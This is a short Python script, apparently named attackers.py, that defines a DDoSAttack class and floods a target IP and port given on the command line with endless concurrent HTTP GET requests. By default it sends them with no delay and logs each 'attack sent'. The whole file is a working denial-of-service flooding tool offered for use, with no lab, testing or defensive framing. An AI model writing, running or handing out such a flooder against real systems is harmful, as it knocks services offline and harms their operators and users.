import asyncio
import aiohttp
import time
from queue import Queue
import threading
import sys

class DDoSAttack:
    def __init__(self, target_ip, target_port, num_threads, timeout=0):
        self.target_url = f"http://{target_ip}:{target_port}"
        self.num_threads = num_threads
        self.queue = Queue()
        self.total_requests = 0
        self.lock = threading.Lock()
        self.timeout = timeout

    async def attack(self, thread_name):
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get(self.target_url) as response:
                        with self.lock:
                            self.total_requests += 1
                        print(f"Thread: {thread_name} - Attack sent at {time.strftime('%Y-%m-%d %H:%M:%S')} - Status Code: {response.status}")
                except aiohttp.ClientError as e:
                    print(f"Thread: {thread_name} - Error during attack at {time.strftime('%Y-%m-%d %H:%M:%S')} - Exception: {e}")
                await asyncio.sleep(self.timeout)

    async def worker(self, thread_name):
        while True:
            await self.attack(thread_name)

    def start_attacks(self):
        loop = asyncio.get_event_loop()
        tasks = [loop.create_task(self.worker(f"Thread-{i+1}")) for i in range(self.num_threads)]
        loop.run_until_complete(asyncio.wait(tasks))
        print(f"Total requests sent: {self.total_requests}")


if __name__ == "__main__":
    if len(sys.argv) != 4 and len(sys.argv) != 5:
        print("Usage: python attackers.py <target_ip> <target_port> <num_threads> [timeout]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    timeout = float(sys.argv[4]) if len(sys.argv) == 5 else 0

    ddos = DDoSAttack(target_ip, target_port, num_threads, timeout)
    ddos.start_attacks()

